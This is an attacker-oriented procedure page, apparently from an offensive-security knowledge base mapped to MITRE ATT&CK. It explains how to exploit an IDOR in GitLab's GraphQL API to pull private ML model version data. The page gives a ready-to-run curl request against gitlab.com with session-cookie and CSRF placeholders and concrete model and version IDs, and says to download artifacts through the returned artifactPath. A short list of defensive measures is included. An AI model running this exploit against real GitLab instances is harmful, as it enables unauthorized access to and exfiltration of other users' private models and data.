---
id: proc-gitlab-query-version-idor
tags:
  - idor
  - graphql
  - version-access
  - gitlab
  - data-exfiltration
type: procedure
tools: []
tactics:
  - '[[Collection]]'
commands:
  - '[[commands/gitlab-graphql-get-model-version]]'
verified: false
platforms:
  - Web
  - GitLab
submitted: true
created_at: '2024-10-01T00:00:00Z'
techniques:
  - '[[Data from Information Repositories]]'
updated_at: '2025-12-14T17:25:47.614Z'
skill_level: intermediate
impact_level: high
detection_risk: medium
sub_techniques: []
validated: true
mitre_tactics:
  - '[[Collection]]'
mitre_techniques:
  - '[[Data from Information Repositories]]'
---
# Query-ML-Model-Version-Details-via-GraphQL-IDOR

## Summary

This procedure exploits IDOR to access specific versions of unauthorized ML models in GitLab via GraphQL, retrieving detailed sensitive data like parameters, metadata, metrics, and artifact paths.

## Description

After obtaining model details, version IDs (e.g., gid://gitlab/Ml::ModelVersion/1000535) are guessable and lack authorization checks. The getModelVersion query fetches version-specific info, including candidate params, CI jobs, and download links, enabling full exfiltration of private ML artifacts.

## Requirements

1. Parent model ID and target version ID from prior queries
2. Valid session tokens
3. HTTP client for GraphQL POST

## Defense

Defensive measures and detection strategies:

- Add authorization resolvers for modelVersion queries
- Monitor for cross-project version access in audit logs
- Encrypt or restrict artifact paths in responses

## Objectives

1. Retrieve private model version data
2. Expose experiment parameters and metrics
3. Obtain links to downloadable artifacts

## Instructions

### Step 1: Extract Version ID

**Context**: Parse the latestVersion.id from a model query response.

Identify the global ID for the target version.

### Step 2: Send Version Query

**Context**: Execute the GraphQL query for the version details.

**Command** ([[commands/gitlab-graphql-get-model-version]]):
```bash
curl -X POST 'https://gitlab.com/api/graphql' \
  -H 'Cookie: _gitlab_session=<your-session-cookie>' \
  -H 'X-Csrf-Token: <your-csrf-token>' \
  -H 'Content-Type: application/json' \
  -d '{"operationName":"getModelVersion","variables":{"modelId":"gid://gitlab/Ml::Model/1000401","modelVersionId":"gid://gitlab/Ml::ModelVersion/1000535"},"query":"query getModelVersion($modelId: MlModelID!, $modelVersionId: MlModelVersionID!) { mlModel(id: $modelId) { id name version(modelVersionId: $modelVersionId) { id version packageId description candidate { id name iid eid status params { nodes { id name value __typename } __typename } metadata { nodes { id name value __typename } __typename } metrics { nodes { id name value step __typename } __typename } ciJob { id webPath name pipeline { id mergeRequest { id iid title webUrl __typename } user { id avatarUrl webUrl username name __typename } __typename } __typename } _links { showPath artifactPath __typename } __typename } _links { showPath __typename } __typename } __typename } }"}'
```

> Response contains version data; use artifactPath to download files if accessible.

## MITRE ATT&CK Mapping

### Tactics

- [[Collection]] Collection

### Techniques

- [[Data from Information Repositories]] Data from Information Repositories

### Sub-Techniques


## Commands Used

- [[commands/gitlab-graphql-get-model-version]]

## Tools Used


## Tags

- idor
- graphql
- version-access
- gitlab
- data-exfiltration
